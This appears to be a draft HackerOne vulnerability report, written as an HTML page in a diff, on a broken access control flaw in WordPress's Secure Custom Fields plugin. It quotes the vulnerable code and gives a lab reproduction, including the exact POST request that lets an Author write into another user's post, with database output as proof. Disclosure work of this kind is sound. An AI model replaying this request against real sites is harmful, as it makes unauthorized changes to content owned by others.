@@ -1,0 +1,645 @@
+<title>Bidirectional Bypass</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Source+Serif+4:ital,opsz,wght@0,8..60,400;0,8..60,500;0,8..60,600;0,8..60,700;1,8..60,500&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&family=IBM+Plex+Mono:wght@400;500;600&display=swap');
+
+  :root{
+    --bg:            #f1f3f7;
+    --surface:       #ffffff;
+    --surface-2:     #e8ebf1;
+    --line:          #d7dce5;
+    --ink:           #161a23;
+    --ink-muted:     #555f72;
+    --ink-faint:     #8891a3;
+    --accent:        #2f5f8a;
+    --accent-ink:    #1d4b73;
+    --accent-tint:   #e4edf5;
+    --flag:          #a8571a;
+    --flag-tint:     #f7e9dd;
+    --ok:            #2f7a52;
+    --ok-tint:       #e1f0e7;
+    --bad:           #b23b3b;
+    --bad-tint:      #f8e4e4;
+    --code-bg:       #11141c;
+    --code-bg-2:     #171b26;
+    --code-ink:      #dde3ee;
+    --code-muted:    #8a93aa;
+    --code-accent:   #85b7de;
+    --code-string:   #c7d68a;
+    --shadow:        0 1px 2px rgba(20,24,34,.04), 0 8px 24px -12px rgba(20,24,34,.12);
+  }
+
+  @media (prefers-color-scheme: dark){
+    :root:not([data-theme="light"]){
+      --bg:          #14161d;
+      --surface:     #1a1d26;
+      --surface-2:   #20242f;
+      --line:        #2c313e;
+      --ink:         #e7eaf1;
+      --ink-muted:   #a3aabb;
+      --ink-faint:   #6c7488;
+      --accent:      #7fb0d9;
+      --accent-ink:  #a7cbea;
+      --accent-tint: #1f2c38;
+      --flag:        #d99a5f;
+      --flag-tint:   #33261a;
+      --ok:          #74c79a;
+      --ok-tint:     #17281f;
+      --bad:         #e08787;
+      --bad-tint:    #2e1c1c;
+      --code-bg:     #0c0e13;
+      --code-bg-2:   #12151d;
+      --code-ink:    #dde3ee;
+      --code-muted:  #7d859c;
+      --code-accent: #85b7de;
+      --code-string: #c7d68a;
+      --shadow:      0 1px 2px rgba(0,0,0,.3), 0 8px 24px -12px rgba(0,0,0,.5);
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:          #14161d;
+    --surface:     #1a1d26;
+    --surface-2:   #20242f;
+    --line:        #2c313e;
+    --ink:         #e7eaf1;
+    --ink-muted:   #a3aabb;
+    --ink-faint:   #6c7488;
+    --accent:      #7fb0d9;
+    --accent-ink:  #a7cbea;
+    --accent-tint: #1f2c38;
+    --flag:        #d99a5f;
+    --flag-tint:   #33261a;
+    --ok:          #74c79a;
+    --ok-tint:     #17281f;
+    --bad:         #e08787;
+    --bad-tint:    #2e1c1c;
+    --code-bg:     #0c0e13;
+    --code-bg-2:   #12151d;
+    --code-ink:    #dde3ee;
+    --code-muted:  #7d859c;
+    --code-accent: #85b7de;
+    --code-string: #c7d68a;
+    --shadow:      0 1px 2px rgba(0,0,0,.3), 0 8px 24px -12px rgba(0,0,0,.5);
+  }
+
+  *{ box-sizing:border-box; }
+  body{
+    background:var(--bg);
+    color:var(--ink);
+    font-family:'IBM Plex Sans', system-ui, -apple-system, sans-serif;
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+  ::selection{ background:var(--accent-tint); color:var(--ink); }
+
+  a{ color:var(--accent-ink); }
+  a:focus-visible, button:focus-visible, summary:focus-visible{
+    outline:2px solid var(--accent); outline-offset:2px; border-radius:2px;
+  }
+
+  .page{ max-width:800px; margin:0 auto; padding:0 24px 96px; }
+
+  /* ---------- masthead ---------- */
+  header.mast{ padding:56px 0 32px; border-bottom:1px solid var(--line); }
+  .eyebrow{
+    font-family:'IBM Plex Mono', monospace;
+    font-size:12px; letter-spacing:.09em; text-transform:uppercase;
+    color:var(--ink-faint); display:flex; align-items:center; gap:8px; margin-bottom:18px;
+  }
+  .eyebrow .dot{ width:5px; height:5px; border-radius:50%; background:var(--flag); }
+  h1.title{
+    font-family:'Source Serif 4', Georgia, serif;
+    font-weight:600;
+    font-size:clamp(28px, 4.4vw, 40px);
+    line-height:1.18;
+    letter-spacing:-.01em;
+    text-wrap:balance;
+    margin:0 0 20px;
+    max-width:26ch;
+  }
+  .dek{
+    font-size:16.5px; color:var(--ink-muted); max-width:62ch; margin:0 0 28px;
+  }
+  .meta-row{ display:flex; flex-wrap:wrap; gap:10px; align-items:center; }
+  .pill{
+    display:inline-flex; align-items:center; gap:6px;
+    font-family:'IBM Plex Mono', monospace; font-size:12px; letter-spacing:.02em;
+    padding:6px 11px; border-radius:100px; border:1px solid var(--line);
+    background:var(--surface); color:var(--ink-muted);
+  }
+  .pill.severity{ background:var(--flag-tint); border-color:transparent; color:var(--flag); font-weight:600; }
+  .pill.severity b{ font-weight:600; }
+  .pill a{ color:inherit; text-decoration:none; }
+  .pill a:hover{ text-decoration:underline; }
+
+  /* ---------- verdict strip ---------- */
+  .verdict{
+    margin:36px 0 0; border:1px solid var(--line); border-radius:12px;
+    overflow:hidden; background:var(--surface); box-shadow:var(--shadow);
+  }
+  .verdict-head{
+    padding:14px 18px; border-bottom:1px solid var(--line);
+    font-family:'IBM Plex Mono', monospace; font-size:11.5px; letter-spacing:.08em;
+    text-transform:uppercase; color:var(--ink-faint);
+  }
+  .vrow{
+    display:grid; grid-template-columns:1fr auto; gap:6px 16px; align-items:center;
+    padding:15px 18px; border-bottom:1px solid var(--line);
+  }
+  .vrow:last-child{ border-bottom:none; }
+  .vrow .path{ font-weight:500; font-size:14.5px; }
+  .vrow .path code{ font-size:13px; }
+  .vrow .sub{ grid-column:1; font-size:13px; color:var(--ink-muted); margin-top:1px; }
+  .status{
+    grid-row:1; grid-column:2;
+    font-family:'IBM Plex Mono', monospace; font-size:12px; font-weight:600;
+    letter-spacing:.03em; padding:5px 11px; border-radius:7px; white-space:nowrap;
+  }
+  .status.bad{ background:var(--bad-tint); color:var(--bad); }
+  .status.ok{ background:var(--ok-tint); color:var(--ok); }
+
+  /* ---------- inline code / cites ---------- */
+  code{
+    font-family:'IBM Plex Mono', monospace; font-size:.89em;
+    background:var(--surface-2); padding:.14em .4em; border-radius:5px;
+    color:var(--ink);
+  }
+  a.cite{
+    font-family:'IBM Plex Mono', monospace; font-size:12.5px;
+    display:inline-flex; align-items:center; gap:5px;
+    background:var(--accent-tint); color:var(--accent-ink);
+    padding:3px 9px 3px 8px; border-radius:6px; text-decoration:none;
+    border:1px solid transparent; line-height:1.5;
+  }
+  a.cite:hover{ border-color:var(--accent); }
+  a.cite svg{ flex:none; opacity:.75; }
+
+  /* ---------- prose sections ---------- */
+  main{ padding-top:8px; }
+  section{ padding:44px 0; border-bottom:1px solid var(--line); }
+  section:last-of-type{ border-bottom:none; }
+  .section-label{
+    font-family:'IBM Plex Mono', monospace; font-size:12px; letter-spacing:.08em;
+    text-transform:uppercase; color:var(--accent); margin:0 0 10px; display:block;
+  }
+  h2{
+    font-family:'Source Serif 4', Georgia, serif; font-weight:600;
+    font-size:26px; line-height:1.25; letter-spacing:-.005em; text-wrap:balance;
+    margin:0 0 18px;
+  }
+  h3{
+    font-family:'IBM Plex Sans', sans-serif; font-weight:600;
+    font-size:16px; margin:30px 0 12px; display:flex; align-items:baseline; gap:10px;
+  }
+  h3 .num{
+    font-family:'IBM Plex Mono', monospace; font-size:13px; color:var(--accent);
+    background:var(--accent-tint); width:22px; height:22px; border-radius:6px;
+    display:inline-flex; align-items:center; justify-content:center; flex:none;
+  }
+  p{ margin:0 0 16px; max-width:66ch; color:var(--ink); }
+  p.muted{ color:var(--ink-muted); }
+  ul, ol{ margin:0 0 16px; padding-left:1.3em; max-width:64ch; }
+  li{ margin-bottom:8px; }
+  strong{ font-weight:600; }
+
+  blockquote.tell{
+    margin:22px 0; padding:18px 22px; border-left:3px solid var(--flag);
+    background:var(--flag-tint); border-radius:0 10px 10px 0;
+    font-family:'Source Serif 4', serif; font-style:italic; font-size:17.5px;
+    color:var(--ink); max-width:60ch;
+  }
+
+  /* ---------- code panels ---------- */
+  .code-wrap{ margin:16px 0 20px; border-radius:11px; overflow:hidden; box-shadow:var(--shadow); }
+  .code-file{
+    background:var(--code-bg-2); color:var(--code-muted);
+    font-family:'IBM Plex Mono', monospace; font-size:12px;
+    padding:9px 16px; display:flex; align-items:center; gap:8px;
+    border-bottom:1px solid rgba(255,255,255,.06);
+  }
+  .code-file .lang-dot{ width:7px; height:7px; border-radius:50%; background:var(--code-accent); flex:none; }
+  .code-file a{ color:var(--code-muted); text-decoration:none; margin-left:auto; }
+  .code-file a:hover{ color:var(--code-accent); }
+  pre{
+    margin:0; padding:16px 18px; background:var(--code-bg); overflow-x:auto;
+    font-family:'IBM Plex Mono', monospace; font-size:12.8px; line-height:1.65;
+    color:var(--code-ink);
+  }
+  pre code{ background:none; padding:0; color:inherit; font-size:1em; }
+  .tok-c{ color:var(--code-muted); font-style:italic; }
+  .tok-k{ color:var(--code-accent); }
+  .tok-s{ color:var(--code-string); }
+  .tok-fn{ color:#e0b979; }
+  .mark-line{ display:block; margin:0 -18px; padding:0 18px; background:rgba(216,143,71,.12); border-left:2px solid var(--flag); padding-left:16px; }
+
+  /* ---------- proof blocks ---------- */
+  .proof{
+    margin:18px 0; border-radius:11px; overflow:hidden; border:1px solid var(--line);
+    box-shadow:var(--shadow);
+  }
+  .proof-head{
+    display:flex; align-items:center; gap:10px; padding:12px 16px;
+    background:var(--surface); border-bottom:1px solid var(--line);
+  }
+  .proof-letter{
+    font-family:'IBM Plex Mono', monospace; font-weight:600; font-size:13px;
+    width:24px; height:24px; border-radius:7px; display:inline-flex;
+    align-items:center; justify-content:center; flex:none;
+  }
+  .proof.ok .proof-letter{ background:var(--ok-tint); color:var(--ok); }
+  .proof.bad .proof-letter{ background:var(--bad-tint); color:var(--bad); }
+  .proof.neutral .proof-letter{ background:var(--surface-2); color:var(--ink-muted); }
+  .proof-title{ font-size:14px; font-weight:500; }
+  .proof-outcome{
+    margin-left:auto; font-family:'IBM Plex Mono', monospace; font-size:11px;
+    font-weight:600; letter-spacing:.03em; padding:3px 9px; border-radius:100px;
+  }
+  .proof.ok .proof-outcome{ background:var(--ok-tint); color:var(--ok); }
+  .proof.bad .proof-outcome{ background:var(--bad-tint); color:var(--bad); }
+  .proof pre{ font-size:12.5px; }
+  .proof-note{ padding:13px 16px; font-size:13.5px; color:var(--ink-muted); background:var(--surface); border-top:1px solid var(--line); }
+  .proof-note code{ font-size:.92em; }
+
+  /* ---------- steps ---------- */
+  .steps{ counter-reset:step; margin:20px 0; }
+  .step{ position:relative; padding-left:44px; margin-bottom:26px; counter-increment:step; }
+  .step::before{
+    content:counter(step); position:absolute; left:0; top:1px;
+    font-family:'IBM Plex Mono', monospace; font-weight:600; font-size:13px;
+    width:30px; height:30px; border-radius:50%; background:var(--accent-tint);
+    color:var(--accent-ink); display:flex; align-items:center; justify-content:center;
+  }
+  .step h4{ font-size:15px; font-weight:600; margin:2px 0 8px; }
+  .step .code-wrap{ margin-top:10px; margin-bottom:0; }
+
+  /* ---------- table ---------- */
+  .table-wrap{ overflow-x:auto; margin:18px 0; border:1px solid var(--line); border-radius:11px; }
+  table{ width:100%; border-collapse:collapse; font-size:13.5px; min-width:520px; }
+  th, td{ text-align:left; padding:12px 16px; border-bottom:1px solid var(--line); }
+  th{
+    font-family:'IBM Plex Mono', monospace; font-size:11px; letter-spacing:.06em;
+    text-transform:uppercase; color:var(--ink-faint); background:var(--surface-2); font-weight:500;
+  }
+  tr:last-child td{ border-bottom:none; }
+  td code{ font-size:.85em; }
+
+  /* ---------- cvss ---------- */
+  .cvss-box{
+    display:flex; flex-wrap:wrap; gap:20px; align-items:flex-start;
+    margin:18px 0; padding:20px; border:1px solid var(--line); border-radius:12px;
+    background:var(--surface);
+  }
+  .cvss-score{ text-align:center; flex:none; }
+  .cvss-score .num{ font-family:'Source Serif 4', serif; font-weight:600; font-size:38px; line-height:1; color:var(--flag); }
+  .cvss-score .band{ font-family:'IBM Plex Mono', monospace; font-size:11px; color:var(--ink-faint); text-transform:uppercase; letter-spacing:.06em; margin-top:4px; }
+  .cvss-vector{ flex:1; min-width:220px; }
+  .cvss-vector code{
+    display:inline-block; font-size:13px; background:var(--code-bg); color:var(--code-accent);
+    padding:8px 12px; border-radius:8px; letter-spacing:.02em;
+  }
+  .cvss-vector p{ margin-top:10px; margin-bottom:0; font-size:13.5px; color:var(--ink-muted); }
+
+  /* ---------- two-col footer grid ---------- */
+  .grid2{ display:grid; grid-template-columns:1fr 1fr; gap:32px; }
+  @media (max-width:640px){ .grid2{ grid-template-columns:1fr; } }
+  .grid2 h3{ margin-top:0; }
+
+  /* ---------- footer ---------- */
+  footer{ padding:40px 0 0; }
+  .footer-note{
+    font-size:12.5px; color:var(--ink-faint); font-family:'IBM Plex Mono', monospace;
+    line-height:1.7;
+  }
+  details.repro{ margin-top:24px; }
+  details.repro summary{
+    cursor:pointer; font-family:'IBM Plex Mono', monospace; font-size:12.5px;
+    color:var(--ink-muted); padding:10px 0; list-style:none;
+  }
+  details.repro summary::-webkit-details-marker{ display:none; }
+  details.repro summary::before{ content:'▸ '; color:var(--accent); }
+  details.repro[open] summary::before{ content:'▾ '; }
+
+  @media (prefers-reduced-motion:no-preference){
+    header.mast{ animation:rise .5s ease-out; }
+    @keyframes rise{ from{opacity:0; transform:translateY(6px);} to{opacity:1; transform:none;} }
+  }
+</style>
+
+<div class="page">
+
+  <header class="mast">
+    <div class="eyebrow"><span class="dot"></span>HackerOne submission draft &nbsp;·&nbsp; WordPress program</div>
+    <h1 class="title">Bidirectional-field sync bypasses SCF's access control on the save path most sites actually use</h1>
+    <p class="dek">Secure Custom Fields' 6.9.5 changelog documents a fix for unauthorized bidirectional-field writes &mdash; scoped, by its own wording, to <strong>REST updates</strong>. The classic post-edit screen and the standard Gutenberg block-editor save use a different path entirely, and it has no such check.</p>
+    <div class="meta-row">
+      <span class="pill severity"><b>Medium</b> &nbsp;CVSS 4.3</span>
+      <span class="pill">Broken Access Control</span>
+      <span class="pill">Secure Custom Fields</span>
+      <span class="pill"><a href="https://github.com/WordPress/secure-custom-fields/commit/99cd25279b067f23afc93a75897739660a74da26" target="_blank" rel="noopener">99cd252 &middot; 6.9.5</a></span>
+    </div>
+
+    <div class="verdict">
+      <div class="verdict-head">Same attack, three entry points</div>
+      <div class="vrow">
+        <div><div class="path">Classic / Gutenberg save &nbsp;<code>wp-admin/post.php</code></div>
+          <div class="sub">Author saves their own post &middot; bidirectional field points at a post they don't own</div></div>
+        <div class="status bad">VULNERABLE</div>
+      </div>
+      <div class="vrow">
+        <div><div class="path">REST API &nbsp;<code>POST /wp/v2/posts/&lt;id&gt;</code></div>
+          <div class="sub">Identical payload, identical session</div></div>
+        <div class="status ok">BLOCKED &middot; 403</div>
+      </div>
+      <div class="vrow">
+        <div><div class="path">Direct access to the victim post</div>
+          <div class="sub">Sanity check &mdash; confirms the attacker genuinely has no standing access</div></div>
+        <div class="status ok">BLOCKED &middot; 403</div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+
+    <section>
+      <span class="section-label">Description</span>
+      <h2>One shared write function, two checks bolted on beside it</h2>
+      <p>SCF's Relationship, Post Object, User, and Taxonomy fields support a <strong>Bidirectional</strong> setting: when field A on object X is marked bidirectional with a target field B, saving A on X doesn't just store the selected IDs on X &mdash; it also reaches out and updates B <em>on every object A's value points at</em>, adding or removing a back-reference to X. The write to that target object happens with no check that the acting user is allowed to edit the target &mdash; only that they can edit X, the object actually being saved.</p>
+      <p>SCF's own <code>6.9.5</code> changelog (<em>Release date 7 August 2026</em> &mdash; the version this was found in) documents a fix for exactly this bug class:</p>
+      <blockquote class="tell">&ldquo;REST updates now reject bidirectional field writes when the current user cannot edit an inverse target.&rdquo;</blockquote>
+      <p>That sentence names its own boundary: <strong>REST updates</strong>. The fix is real, and I verified it holds. What it doesn't cover &mdash; and what remains fully exploitable, with no special configuration &mdash; is the save path every classic post-edit screen and every standard Gutenberg block-editor save actually uses. An Author (the lowest role that can be granted this field) can use a completely ordinary save of their own post to force a write into a post owned by someone else, that they otherwise cannot edit at all.</p>
+    </section>
+
+    <section>
+      <span class="section-label">Root cause</span>
+      <h2>File:line, verbatim, at commit <code>99cd252</code></h2>
+
+      <h3><span class="num">1</span>The write itself has no capability check</h3>
+      <div class="code-wrap">
+        <div class="code-file"><span class="lang-dot"></span>includes/acf-bidirectional-functions.php
+          <a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/acf-bidirectional-functions.php#L21-L61" target="_blank" rel="noopener">L21&ndash;61 ↗</a>
+        </div>
+        <pre><code><span class="tok-k">function</span> <span class="tok-fn">acf_update_bidirectional_values</span>( $target_item_ids, $post_id, $field, $target_prefix = <span class="tok-k">false</span> ) {
+	<span class="tok-c">// Bail early if we're already updating a bidirectional relationship to prevent recursion.</span>
+	<span class="tok-k">if</span> ( acf_get_data( <span class="tok-s">'acf_doing_bidirectional_update'</span> ) ) { <span class="tok-k">return</span>; }
+	<span class="tok-c">// Support disabling bidirectionality globally.</span>
+	<span class="tok-k">if</span> ( ! acf_get_setting( <span class="tok-s">'enable_bidirection'</span> ) ) { <span class="tok-k">return</span>; }
+	<span class="tok-k">if</span> ( empty( $field[<span class="tok-s">'bidirectional'</span>] ) || empty( $field[<span class="tok-s">'bidirectional_target'</span>] ) ) { <span class="tok-k">return</span>; }
+
+	$update_plan = _scf_prepare_bidirectional_update( $target_item_ids, $post_id, $field, $target_prefix );
+	<span class="tok-c">...</span>
+	<span class="tok-k">if</span> ( ! empty( $valid_targets ) ) {
+		<span class="tok-k">foreach</span> ( $valid_targets <span class="tok-k">as</span> $target_field ) {
+			<span class="tok-k">foreach</span> ( $additions <span class="tok-k">as</span> $addition ) {
+<span class="mark-line">				update_field( $target_field, array_merge( $current_value, [ $item_id ] ), $addition );  <span class="tok-c">// no capability check on $addition</span></span>
+			}
+			<span class="tok-k">foreach</span> ( $subtractions <span class="tok-k">as</span> $subtraction ) {
+<span class="mark-line">				update_field( $target_field, array_diff( $current_value, [ $item_id ] ), $subtraction );  <span class="tok-c">// same, for removals</span></span>
+			}
+		}
+	}
+}</code></pre>
+      </div>
+      <p><code>$target_item_ids</code> is the field's <em>submitted value</em> &mdash; the post IDs the saving user selected. <code>enable_bidirection</code> is <code>true</code> by default (<a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/secure-custom-fields.php#L171" target="_blank" rel="noopener">secure&#8209;custom&#8209;fields.php:171 ↗</a>). Relationship/Post Object fields never filter selectable results by whether the <em>selecting</em> user can <em>edit</em> the candidate &mdash; only by the field's own type/status/taxonomy config &mdash; so any post the field is configured to allow can be used as <code>$addition</code>.</p>
+
+      <h3><span class="num">2</span>Called unconditionally from every field's normal save hook</h3>
+      <div class="code-wrap">
+        <div class="code-file"><span class="lang-dot"></span>includes/fields/class-acf-field-relationship.php
+          <a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/fields/class-acf-field-relationship.php#L804-L826" target="_blank" rel="noopener">L804&ndash;826 ↗</a>
+        </div>
+        <pre><code><span class="tok-k">public function</span> <span class="tok-fn">update_value</span>( $value, $post_id, $field ) {
+	<span class="tok-k">if</span> ( empty( $value ) ) {
+		acf_update_bidirectional_values( [], $post_id, $field );
+		<span class="tok-k">return</span> $value;
+	}
+	<span class="tok-c">...</span>
+	acf_update_bidirectional_values( acf_get_array( $value ), $post_id, $field );
+	<span class="tok-k">return</span> $value;
+}</code></pre>
+      </div>
+      <p><code>update_value()</code> is the standard per-field save hook &mdash; called for every save, through every entrypoint, with nothing entrypoint-specific about it.</p>
+
+      <h3><span class="num">3</span>The only permission checks that exist are both REST-specific</h3>
+      <div class="code-wrap">
+        <div class="code-file"><span class="lang-dot"></span>includes/rest-api/class-acf-rest-api.php
+          <a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/rest-api/class-acf-rest-api.php#L279-L310" target="_blank" rel="noopener">L279&ndash;310 ↗</a>
+        </div>
+        <pre><code><span class="tok-c">// hooked on 'rest_dispatch_request' — class-acf-rest-api.php:32</span>
+<span class="tok-k">private function</span> <span class="tok-fn">check_bidirectional_target_permissions</span>( $dispatch_result, $request ) {
+	<span class="tok-c">...</span>
+	<span class="tok-k">foreach</span> ( $updates <span class="tok-k">as</span> [ $field, $value ] ) {
+		<span class="tok-k">foreach</span> ( _scf_collect_bidirectional_destinations( $field, $value, ... ) <span class="tok-k">as</span> $destination ) {
+			<span class="tok-k">if</span> ( ! acf_current_user_can_edit_in_context( acf_decode_post_id( $destination ) ) ) {
+				<span class="tok-k">return new</span> WP_Error( <span class="tok-s">'acf_rest_cannot_update_bidirectional_target'</span>, ...,
+					[ <span class="tok-s">'status'</span> =&gt; 403 ] );
+			}
+		}
+	}
+}</code></pre>
+      </div>
+      <p>This is the 6.9.5 fix, and it is genuinely enforced &mdash; see Proof E. The only other place this check exists is <a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/Datastore/REST_Save.php#L138-L204" target="_blank" rel="noopener">Datastore/REST_Save.php:138&ndash;204 ↗</a>, also hooked on <code>rest_dispatch_request</code>, but its registration is conditional:</p>
+      <div class="code-wrap">
+        <div class="code-file"><span class="lang-dot"></span>includes/datastore.php
+          <a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/datastore.php#L22-L35" target="_blank" rel="noopener">L22&ndash;35 ↗</a>
+        </div>
+        <pre><code><span class="tok-k">function</span> <span class="tok-fn">acf_is_using_datastore</span>() {
+	<span class="tok-k">if</span> ( ! version_compare( get_bloginfo( <span class="tok-s">'version'</span> ), <span class="tok-s">'6.7'</span>, <span class="tok-s">'&gt;='</span> ) ) { <span class="tok-k">return false</span>; }
+	<span class="tok-c">/** @param boolean $enabled Whether the datastore is enabled. Default false. */</span>
+	<span class="tok-k">return</span> (bool) apply_filters( <span class="tok-s">'acf/settings/enable_datastore'</span>, <span class="tok-k">false</span> );
+}</code></pre>
+      </div>
+      <p><strong>Default <code>false</code></strong> &mdash; confirmed live in Proof B. <code>Datastore/REST_Save.php</code> only registers its hooks (<a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/Datastore/REST_Save.php#L94-L96" target="_blank" rel="noopener">L94&ndash;96 ↗</a>) when this returns true.</p>
+
+      <h3><span class="num">4</span>The unprotected path is what every default install uses</h3>
+      <p><a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/forms/form-post.php#L44" target="_blank" rel="noopener">form-post.php:44 ↗</a> hooks the classic save handler onto WordPress core's own <code>save_post</code> action, which calls <code>acf_save_post()</code> (<a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/forms/form-post.php#L340-L375" target="_blank" rel="noopener">form-post.php:340&ndash;375 ↗</a>) &rarr; <code>_acf_do_save_post()</code> &rarr; <code>acf_update_values()</code> &rarr; <code>acf_update_value()</code> &rarr; the field's <code>update_value()</code> (<a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/acf-form-functions.php#L119-L167" target="_blank" rel="noopener">acf-form-functions.php ↗</a>, <a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/acf-value-functions.php#L216-L281" target="_blank" rel="noopener">acf-value-functions.php ↗</a>) &mdash; none of which call <code>acf_current_user_can_edit_in_context()</code> or anything equivalent.</p>
+      <p>This <code>save_post</code> hook fires for <strong>both</strong> the classic post-edit screen (a plain form POST to <code>wp-admin/post.php</code>) <strong>and</strong> the standard Gutenberg block editor's save of non-block meta box data &mdash; which WordPress core implements as an AJAX request to <code>wp-admin/post.php?meta-box-loader=1</code> that itself triggers <code>save_post</code> the same way. <a class="cite" href="https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/forms/form-gutenberg.php#L173-L179" target="_blank" rel="noopener">form-gutenberg.php:173&ndash;179 ↗</a> confirms SCF is explicitly aware <code>meta-box-loader</code> requests reach this path &mdash; its one Gutenberg-specific hook checks for that flag to relax <em>validation</em>, not to swap the save mechanism. No REST client, no special settings, no Classic Editor requirement.</p>
+    </section>
+
+    <section>
+      <span class="section-label">Reproduction</span>
+      <h2>Five real HTTP requests, one authenticated session</h2>
+      <p class="muted">Lab: fresh WordPress 7.1, SCF at this commit, PHP built-in server, MariaDB. Users <code>admin</code> (ID 1) and <code>author1</code> (ID 2, role Author &mdash; verified no <code>edit_others_posts</code>). Posts <code>10</code> (admin's) and <code>11</code> (author1's). A field group on post type <code>post</code> with two Relationship fields: <code>related_posts</code> (bidirectional, target <code>backlinks</code>) and <code>backlinks</code>. Every request below is real HTTP against a real cookie-authenticated session &mdash; not a direct function call.</p>
+
+      <div class="steps">
+        <div class="step">
+          <h4>Install &amp; configure</h4>
+          <p class="muted" style="margin-bottom:0;">WordPress + SCF installed normally; users, posts, and the bidirectional field group created via SCF's own <code>acf_import_field_group()</code> &mdash; matching what an admin configuring this feature through the UI would produce.</p>
+        </div>
+        <div class="step">
+          <h4>Log in as <code>author1</code> over HTTP</h4>
+          <div class="code-wrap"><pre><code>POST /wp-login.php  log=author1&amp;pwd=...
+&rarr; 302 Found, Location: /wp-admin/
+GET  /wp-admin/profile.php (with resulting cookies)
+&rarr; page shows &quot;Howdy, author1&quot;</code></pre></div>
+        </div>
+        <div class="step">
+          <h4>Fetch <code>author1</code>'s own edit screen for real, session-bound nonces</h4>
+          <p class="muted" style="margin-bottom:8px;">Nonces are tied to the login session token &mdash; they can't be generated out-of-band, only scraped from a real page load in this session.</p>
+          <div class="code-wrap"><pre><code>GET /wp-admin/post.php?post=11&amp;action=edit
+&rarr; _wpnonce=&quot;890c520227&quot;, _acf_nonce=&quot;fb2d11c627&quot;</code></pre></div>
+        </div>
+        <div class="step">
+          <h4>Run the exploit &mdash; save <code>author1</code>'s own post, targeting <code>admin</code>'s</h4>
+          <div class="code-wrap"><pre><code>POST /wp-admin/post.php
+  post_ID=11&amp;action=editpost&amp;post_type=post
+  &amp;_wpnonce=890c520227&amp;_acf_nonce=fb2d11c627
+  &amp;post_status=publish
+  &amp;acf[field_related_posts][0]=10</code></pre></div>
+        </div>
+        <div class="step">
+          <h4>Negative controls, same authenticated session</h4>
+          <div class="code-wrap"><pre><code>GET  /wp-admin/post.php?post=10&amp;action=edit           &rarr; 403
+POST /wp-admin/post.php  post_ID=10&amp;action=editpost... &rarr; 403
+POST /index.php?rest_route=/wp/v2/posts/11
+  {&quot;acf&quot;:{&quot;field_related_posts&quot;:[&quot;10&quot;]}}             &rarr; 403</code></pre></div>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <span class="section-label">Proof</span>
+      <h2>Real, quoted output &mdash; nothing narrated</h2>
+
+      <div class="proof neutral">
+        <div class="proof-head"><span class="proof-letter">A</span><span class="proof-title">Before the exploit</span><span class="proof-outcome" style="background:var(--surface-2);color:var(--ink-muted);">baseline</span></div>
+        <pre><code>mysql&gt; SELECT meta_value FROM wp_postmeta WHERE post_id=10 AND meta_key='backlinks';
+a:0:{}</code></pre>
+      </div>
+
+      <div class="proof neutral">
+        <div class="proof-head"><span class="proof-letter">B</span><span class="proof-title">Datastore confirmed default-off on this install</span></div>
+        <pre><code>enable_bidirection setting: true
+acf_is_using_datastore(): bool(false)</code></pre>
+      </div>
+
+      <div class="proof bad">
+        <div class="proof-head"><span class="proof-letter">C</span><span class="proof-title">The exploit request &amp; result</span><span class="proof-outcome">succeeded</span></div>
+        <pre><code>HTTP/1.1 302 Found
+Location: http://localhost:8890/wp-admin/post.php?post=11&amp;action=edit&amp;message=4
+
+mysql&gt; SELECT meta_value FROM wp_postmeta WHERE post_id=10 AND meta_key='backlinks';
+a:1:{i:0;s:2:&quot;11&quot;;}
+mysql&gt; SELECT meta_value FROM wp_postmeta WHERE post_id=11 AND meta_key='related_posts';
+a:1:{i:0;s:2:&quot;10&quot;;}</code></pre>
+        <div class="proof-note"><code>message=4</code> is WordPress core's own &ldquo;Post updated&rdquo; redirect &mdash; a normal, successful save, indistinguishable from any ordinary edit. Post 10, owned by <code>admin</code> and never touched directly, now backlinks post 11.</div>
+      </div>
+
+      <div class="proof ok">
+        <div class="proof-head"><span class="proof-letter">D</span><span class="proof-title">Negative control &mdash; direct access to post 10</span><span class="proof-outcome">blocked</span></div>
+        <pre><code>GET /wp-admin/post.php?post=10&amp;action=edit  &rarr; HTTP 403
+  &quot;Sorry, you are not allowed&quot;
+POST /wp-admin/post.php  post_ID=10&amp;action=editpost&amp;post_title=HIJACKED...
+  &rarr; HTTP 403 Forbidden
+
+mysql&gt; SELECT post_title FROM wp_posts WHERE ID=10;
+Admin Owned Post 1787977483        &lt;-- unchanged</code></pre>
+      </div>
+
+      <div class="proof ok">
+        <div class="proof-head"><span class="proof-letter">E</span><span class="proof-title">Negative control &mdash; same attack via REST</span><span class="proof-outcome">blocked</span></div>
+        <pre><code>POST /index.php?rest_route=/wp/v2/posts/11
+  {&quot;acf&quot;:{&quot;field_related_posts&quot;:[&quot;10&quot;]}}
+&rarr; HTTP 403
+{&quot;code&quot;:&quot;acf_rest_cannot_update_bidirectional_target&quot;,
+ &quot;message&quot;:&quot;Sorry, you are not allowed to update one or more bidirectional targets.&quot;}
+
+mysql&gt; SELECT meta_value FROM wp_postmeta WHERE post_id=10 AND meta_key='backlinks';
+a:0:{}                              &lt;-- unchanged</code></pre>
+      </div>
+
